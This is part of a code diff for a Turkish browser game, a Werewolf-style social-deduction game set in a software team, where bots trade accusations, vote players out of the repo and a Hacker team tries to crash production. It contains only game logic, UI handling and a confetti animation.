+  const dev = bots.find(p => p.role === 'devops');
+  const devInfo = dev && res.private[dev.id];
+  if (devInfo && devInfo.target != null){
+    const killed = res.deaths.some(d => d.id === devInfo.target);
+    const vis = devInfo.visitors.map(byId).filter(v => v.alive);
+    say(dev, `DevOps'um. ${ek(byId(devInfo.target).name,'in')} loglarını izledim. ${vis.length ? 'Gelen: ' + vis.map(v => v.name).join(', ') + '.' : 'Kimse gelmedi.'}${killed && vis.length ? ' Hacker bunlardan biri.' : ''}`, () => townBots().forEach(b => { if (b !== dev) vis.forEach(v => b.susp[v.id] += killed ? 3.5 : 0.7); }));
+  }
+  // sabotajcı bot yalan iddia
+  const evilBots = bots.filter(isEvil);
+  if (evilBots.length && (G.day >= 2 || Math.random() < .45)){
+    const liar = evilBots.find(p => p.role === 'social') || evilBots[0];
+    const victims = alive().filter(p => !isEvil(p) && p !== sen);
+    if (victims.length){
+      const v = rnd(victims);
+      say(liar, rnd([`Ben Senior Dev'im. Dün gece ${ek(v.name,'e')} baktım, Sabotaj çıktı.`, `${v.name} dün toplantıdan hep kaçıyordu. Bence o.`, `${ek(v.name,'in')} commit'leri çok şüpheli, ona oy verelim.`]), () => townBots().forEach(b => b.susp[v.id] += 2.5));
+      if (sen && sen.alive && G.seniorClaims.includes(sen.id)) say(sen, `${liar.name}, Senior Dev benim. Sen yalan söylüyorsun.`, () => townBots().forEach(b => { if (b !== sen) b.susp[liar.id] += 4; }));
+      else if (v !== G.me) say(v, rnd([`Ben değilim! ${liar.name} neden beni hedef gösteriyor?`, `${liar.name}, kanıtın ne?`]), () => townBots().forEach(b => { if (b !== v) b.susp[liar.id] += 1.2; }));
+    }
+  }
+  // İş Analisti bot raporu paylaşır
+  if (G.analystReport && G.analystReport.by.alive){
+    const { by, ballot } = G.analystReport; const outP = ballot.out != null ? byId(ballot.out) : null;
+    const focus = outP && !isEvil(outP) ? outP : byId(ballot.top);
+    const voters = Object.entries(ballot.votes).filter(([vid, t]) => t === focus.id && +vid !== by.id).map(([vid]) => byId(+vid)).filter(v => v.alive);
+    if (voters.length) say(by, `İş Analistiyim, oy raporuna baktım. Dün ${ek(focus.name,'e')} oy verenler: ${voters.map(v => v.name).join(', ')}.${outP && !isEvil(outP) ? ' Masum birini attık, bunlara dikkat edin.' : ''}`, () => townBots().forEach(b => { if (b !== by) voters.forEach(v => b.susp[v.id] += outP && !isEvil(outP) ? 2.5 : 0.8); }));
+  }
+  const fill = ['Gece çok sessizdi, ben bir şey görmedim.','Kim ne yaptı, açık konuşalım.','Rolümü şimdilik söylemeyeceğim.','Bence aceleyle birini atmayalım.','Pipeline yine kırmızı, biri bir şeyler karıştırıyor.','Escalation açan varsa bir bildiği vardır.'];
+  const fl = shuffle(fill); shuffle(bots).slice(0, 2).forEach((b, i) => say(b, fl[i]));
+  return L;
+}
+
+/* ---------- ses göstergesi ---------- */
+let spaceDown = false;
+function canTalk(){ return G && G.phase === 'meeting' && G.me.alive; }
+function updateMic(){
+  const m = $('#mic'), tx = $('#micTx');
+  const on = spaceDown && canTalk();
+  m.classList.toggle('on', on);
+  tx.textContent = on ? 'Konuşuyorsun' : canTalk() ? 'Space basılı tut' : G && G.phase === 'meeting' && !G.me.alive ? 'Dinliyorsun' : 'Ses kapalı';
+  const a = G && stage.querySelector(`.avatar[data-id="${G.me.id}"]`); if (a) a.classList.toggle('talk', on);
+}
+document.addEventListener('keydown', e => { if (e.code !== 'Space' || e.target.matches('input,textarea,button')) return; e.preventDefault(); if (!spaceDown){ spaceDown = true; updateMic(); } });
+document.addEventListener('keyup', e => { if (e.code !== 'Space') return; spaceDown = false; updateMic(); });
+
+/* ---------- oylama ---------- */
+function botVote(b){
+  const cands = alive().filter(p => p !== b);
+  if (isEvil(b)){
+    // sabotajcılar en çok şüphelenilen Ekip üyesine yüklenir
+    const ts = cands.filter(p => !isEvil(p));
+    const heat = p => townBots().reduce((s, t) => s + (t.susp[p.id] || 0), 0) + (G.escalated[p.id] ? 6 : 0);
+    ts.sort((x, y) => heat(y) - heat(x));
+    if (!ts.length) return 'skip';
+    const mate = partnerOf(b);
+    if (mate && mate.alive && heat(mate) > heat(ts[0])) return ts[0].id; // ortağı kurtarmaya çalış
+    return (G.day >= 2 || heat(ts[0]) > 4) ? ts[0].id : 'skip';
+  }
+  const score = p => b.susp[p.id] + (G.escalated[p.id] ? 1.5 : 0) + Math.random()*0.8;
+  cands.sort((x, y) => score(y) - score(x));
+  const top = cands[0];
+  if (b.known[top.id] === 'town') return 'skip';
+  return score(top) >= 3 ? top.id : 'skip';
+}
+function checkVotesDone(){
+  if (G.phase !== 'meeting' || Object.keys(G.votes).length < alive().length || G.closing) return;
+  G.closing = true; caption('Herkes oy verdi. Sonuç açıklanıyor…', '#FF6E98');
+  later(2500, () => { G.closing = false; endVote(); });
+}
+async function endVote(){
+  if (G.phase !== 'meeting') return;
+  epoch++; G.closing = false;
+  alive().forEach(p => { if (G.votes[p.id] == null) G.votes[p.id] = 'skip'; });
+  const counts = {}; let skip = 0;
+  alive().forEach(p => counts[p.id] = G.escalated[p.id] || 0);
+  Object.values(G.votes).forEach(v => { if (v === 'skip') skip++; else counts[v] = (counts[v] || 0) + 1; });
+  const sorted = Object.entries(counts).map(([id, c]) => [byId(+id), c]).sort((a, b) => b[1] - a[1]);
+  const top = sorted[0][1]; const tops = sorted.filter(s => s[1] === top);
+  let out = null, why = '';
+  if (top === 0) why = 'Kimse oy almadı.';
+  else if (tops.length > 1) why = 'En yüksek oyda eşitlik var. Kimse atılmadı.';
+  else if (skip >= top) why = `Atla (${skip}) en yüksek oydan az değil. Kimse atılmadı.`;
+  else out = tops[0][0];
+  const rows = sorted.filter(s => s[1] > 0).map(([p, c]) => `<div class="pbtn" style="cursor:default"><span class="av" style="background:${p.shirt}">${esc(p.name[0])}</span><span class="nm">${esc(p.name)}${G.escalated[p.id] ? ' <small style="color:var(--muted)">(+2 escalation dahil)</small>' : ''}</span><span class="ct">${c}</span></div>`).join('');
+  G.verdictHtml = `<div class="picks" style="grid-template-columns:1fr">${rows}<div class="pbtn" style="cursor:default"><span class="nm">Atla</span><span class="ct" style="color:var(--muted)">${skip}</span></div></div>
+    <div class="result ${out ? (isEvil(out) ? 'evil' : 'town') : ''}">${out ? `<b>${esc(out.name)}</b> repodan atıldı. Rolü: <b>${ROLES[out.role].name}</b> (${TEAM[ROLES[out.role].team]}).` : why}</div>`;
+  G.lastBallot = { day:G.day, votes:{ ...G.votes }, out: out ? out.id : null, top: tops[0][0].id };
+  setPhase('verdict', `Gün ${G.day} · karar`, 'Sonuçlar toplu açıklandı', 0);
+  const e = epoch;
+  if (out){
+    out.alive = false;
+    caption(`<b>${esc(out.name)}</b> repodan atıldı. Rolü: ${ROLES[out.role].name}.`, isEvil(out) ? '#FF6E98' : '#3FCDB8');
+    sys(`Oylama: ${out.name} atıldı. Rolü: ${ROLES[out.role].name} (${TEAM[ROLES[out.role].team]}).`);
+    const a = stage.querySelector(`.avatar[data-id="${out.id}"]`);
+    if (a) await anim(a, [{ opacity:1, transform:'translate(-50%,-50%) scale(1)' }, { opacity:0, transform:'translate(-50%,-50%) scale(.2) rotate(90deg)' }], { duration:900 });
+    if (e !== epoch) return;
+    out.dom.classList.add('dead'); setSign(out);
+    // atılan kişi hakkında herkes öğrenir
+    G.players.forEach(p => p.known[out.id] = ROLES[out.role].team);
+    if (out.me){ renderRole(); sys('Repodan atıldın. #mezarlık açık.', 'mezarlik'); }
+    if (out.role === 'hacker'){ const sm = G.players.find(p => p.role === 'social' && p.alive); if (sm && sm.me) { sys('Hacker düştü. Artık geceleri sen hackliyorsun.', 'sabotaj'); renderRole(); } }
+  } else {
+    caption(why, '#F2C94C'); sys('Oylama: ' + why);
+  }
+  await wait(G.me.role === 'analyst' && G.me.alive && G.me.uses > 0 ? 7000 : 4200); if (e !== epoch) return;
+  if (checkWin()) return;
+  startNight();
+}
+
+/* ---------- kazanma ---------- */
+function checkWin(){
+  const al = alive(); const ev = al.filter(isEvil).length; const tw = al.length - ev;
+  let winner = null;
+  if (ev === 0) winner = 'town'; else if (ev >= tw) winner = 'evil';
+  if (!winner) return false;
+  epoch++; clearInterval(tick); G.phase = 'over';
+  refreshChatInput(); updateMic();
+  const iWon = ROLES[G.me.role].team === winner;
+  $('#phName').textContent = 'Oyun bitti'; $('#phSub').textContent = winner === 'town' ? 'Ekip kazandı' : 'Sabotaj kazandı'; $('#timer').textContent = '--';
+  $('#endTitle').innerHTML = winner === 'town' ? 'Prod kurtarıldı. <span style="color:var(--town)">Ekip</span> kazandı.' : 'Prod çöktü. <span>Sabotaj</span> kazandı.';
+  $('#endSub').textContent = (iWon ? 'Sen kazandın. ' : 'Bu sefer kaybettin. ') + `Oyun ${G.day}. günde bitti.`;
+  $('#endReveal').innerHTML = G.players.map(p => `<div style="border-color:${ROLES[p.role].team === 'evil' ? 'var(--evil)' : 'var(--line)'}"><b>${esc(p.name)}${p.me ? ' (sen)' : ''}</b><small style="color:${ROLES[p.role].team === 'evil' ? 'var(--evil)' : 'var(--town)'}">${ROLES[p.role].name} · ${p.alive ? 'hayatta' : 'düştü'}</small></div>`).join('');
+  if (iWon) confetti();
+  setTimeout(() => { $('#endBox').hidden = false; }, iWon ? 1800 : 600);
+  return true;
+}
+function confetti(){
+  if (matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+  const c = document.createElement('canvas'); c.id = 'confetti'; stage.appendChild(c);
+  const r = stage.getBoundingClientRect(); c.width = r.width; c.height = r.height; const ctx = c.getContext('2d');
+  const cols = ['#3FCDB8','#A99CFF','#F2C94C','#FF8FB1','#7FA2FF'];
+  const ps = Array.from({ length:140 }, () => ({ x:r.width/2, y:r.height*0.45, vx:(Math.random()-.5)*14, vy:-Math.random()*12-4, s:6+Math.random()*6, a:Math.random()*6, va:(Math.random()-.5)*.4, c:rnd(cols) }));
+  const t0 = performance.now();
+  (function frame(t){ ctx.clearRect(0, 0, r.width, r.height); for (const p of ps){ p.vy += .28; p.x += p.vx; p.y += p.vy; p.a += p.va; ctx.save(); ctx.translate(p.x, p.y); ctx.rotate(p.a); ctx.fillStyle = p.c; ctx.fillRect(-p.s/2, -p.s/4, p.s, p.s/2); ctx.restore(); } if (t - t0 < 2600) requestAnimationFrame(frame); else c.remove(); })(t0);
+}
+
+// lobi arkasında boş köy görünsün
+G = { players: [{ id:0, name:'Burak', me:true, ...ME_LOOK, role:'senior', alive:true, spot:SPOTS[ME_SPOT] }, ...PEOPLE.map((b, i) => ({ id:i+1, ...b, role:'qa', alive:true, spot:SPOTS.filter((_, j) => j !== ME_SPOT)[i] }))], phase:'lobby', me:null };
+G.me = G.players[0];
+buildOffices(); refreshChatInput(); G.phase = 'lobby';
+$('#roleBox').innerHTML = '<h3>Rolün</h3><p class="note">Oyun başlayınca rolün burada görünür.</p>';
+$('#actBox').innerHTML = '<h3>Hamle</h3><p class="note">Gece hamleleri ve oylama burada.</p>';
+})();
+</script>
+
+</body>
+</html>
